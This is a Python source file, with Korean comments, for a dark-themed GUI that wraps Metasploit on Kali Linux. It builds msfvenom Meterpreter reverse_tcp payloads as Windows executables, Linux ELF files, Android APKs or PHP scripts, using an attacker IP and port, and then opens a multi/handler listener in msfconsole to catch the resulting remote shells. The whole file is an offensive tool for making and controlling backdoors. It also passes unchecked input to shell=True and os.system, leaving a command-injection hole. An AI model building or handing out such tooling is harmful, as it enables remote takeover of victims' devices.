import customtkinter as ctk
import subprocess
import threading
import os
from tkinter import filedialog, messagebox

# --- GUI 테마 설정 ---
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

class MsfVenomApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Kali Linux MSF Control Center")
        self.geometry("800x700")

        # 1. 제목
        self.title_label = ctk.CTkLabel(self, text="MSFVenom Builder & Listener", font=("Arial", 24, "bold"))
        self.title_label.pack(pady=20)

        # 2. 네트워크 설정 (LHOST, LPORT)
        self.net_frame = ctk.CTkFrame(self)
        self.net_frame.pack(pady=10, padx=20, fill="x")

        self.lhost = ctk.CTkEntry(self.net_frame, placeholder_text="LHOST (공격자 IP)", width=300)
        self.lhost.grid(row=0, column=0, padx=10, pady=15)

        self.lport = ctk.CTkEntry(self.net_frame, placeholder_text="LPORT (포트)", width=150)
        self.lport.grid(row=0, column=1, padx=10, pady=15)

        # 3. 페이로드 및 포맷 설정
        self.opt_frame = ctk.CTkFrame(self)
        self.opt_frame.pack(pady=10, padx=20, fill="x")

        self.payload_type = ctk.CTkOptionMenu(self.opt_frame, values=[
            "windows/x64/meterpreter/reverse_tcp",
            "linux/x64/meterpreter/reverse_tcp",
            "android/meterpreter/reverse_tcp",
            "php/meterpreter/reverse_tcp"
        ], width=350)
        self.payload_type.grid(row=0, column=0, padx=10, pady=15)

        self.format_type = ctk.CTkOptionMenu(self.opt_frame, values=["exe", "elf", "apk", "php", "raw"], width=120)
        self.format_type.grid(row=0, column=1, padx=10, pady=15)

        # 4. 저장 경로 설정
        self.path_frame = ctk.CTkFrame(self)
        self.path_frame.pack(pady=10, padx=20, fill="x")

        self.path_entry = ctk.CTkEntry(self.path_frame, placeholder_text="파일 저장 경로", width=500)
        self.path_entry.pack(side="left", padx=10, pady=15)

        self.path_btn = ctk.CTkButton(self.path_frame, text="Browse", command=self.browse_path, width=80)
        self.path_btn.pack(side="left", padx=5)

        # 5. 실행 로그 창
        self.log_box = ctk.CTkTextbox(self, height=180, fg_color="#1e1e1e", text_color="#00ff00")
        self.log_box.pack(pady=10, padx=20, fill="both")
        self.log_box.insert("0.0", "[*] 시스템 준비 완료.\n")
        self.log_box.configure(state="disabled")

        # 6. 하단 버튼 영역 (생성 및 리스너)
        self.btn_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.btn_frame.pack(pady=20)

        self.gen_button = ctk.CTkButton(self.btn_frame, text="1. GENERATE PAYLOAD", 
                                        fg_color="#c0392b", hover_color="#a93226",
                                        font=("Arial", 16, "bold"), height=45,
                                        command=self.start_gen_thread)
        self.gen_button.grid(row=0, column=0, padx=10)

        self.list_button = ctk.CTkButton(self.btn_frame, text="2. START LISTENER", 
                                         fg_color="#27ae60", hover_color="#229954",
                                         font=("Arial", 16, "bold"), height=45,
                                         command=self.start_listener)
        self.list_button.grid(row=0, column=1, padx=10)

    # --- 기능 함수들 ---

    def browse_path(self):
        fmt = self.format_type.get()
        filename = filedialog.asksaveasfilename(defaultextension=f".{fmt}")
        if filename:
            self.path_entry.delete(0, "end")
            self.path_entry.insert(0, filename)

    def update_log(self, text):
        self.log_box.configure(state="normal")
        self.log_box.insert("end", text + "\n")
        self.log_box.see("end")
        self.log_box.configure(state="disabled")

    def start_gen_thread(self):
        self.gen_button.configure(state="disabled")
        threading.Thread(target=self.execute_msfvenom, daemon=True).start()

    def execute_msfvenom(self):
        lhost, lport = self.lhost.get(), self.lport.get()
        payload, fmt, output = self.payload_type.get(), self.format_type.get(), self.path_entry.get()

        if not all([lhost, lport, output]):
            messagebox.showwarning("입력 누락", "모든 정보를 입력해주세요!")
            self.gen_button.configure(state="normal")
            return

        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {fmt} -o {output}"
        self.update_log(f"\n[+] 생성 시작: {cmd}")

        try:
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            for line in process.stdout:
                self.update_log(line.strip())
            process.wait()
            if process.returncode == 0:
                self.update_log("[SUCCESS] 페이로드 생성 완료!")
                messagebox.showinfo("성공", "파일이 생성되었습니다.")
        except Exception as e:
            self.update_log(f"[!] 에러: {str(e)}")
        
        self.gen_button.configure(state="normal")

    def start_listener(self):
        lhost, lport = self.lhost.get(), self.lport.get()
        payload = self.payload_type.get()

        if not lhost or not lport:
            messagebox.showwarning("입력 누락", "IP와 Port를 먼저 입력해주세요!")
            return

        # 리스너 실행을 위한 msfconsole 명령어 조합
        msf_commands = f"use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; exploit"
        
        self.update_log(f"[*] 리스너 시작 중... (새 터미널 확인)")
        
        # Kali Linux의 qterminal을 사용하여 새 창에서 msfconsole 실행
        # 만약 다른 터미널을 쓴다면 'qterminal' 부분을 'x-terminal-emulator' 등으로 바꿀 수 있습니다.
        os.system(f"qterminal -e 'msfconsole -x \"{msf_commands}\"' &")

if __name__ == "__main__":
    app = MsfVenomApp()
    app.mainloop()
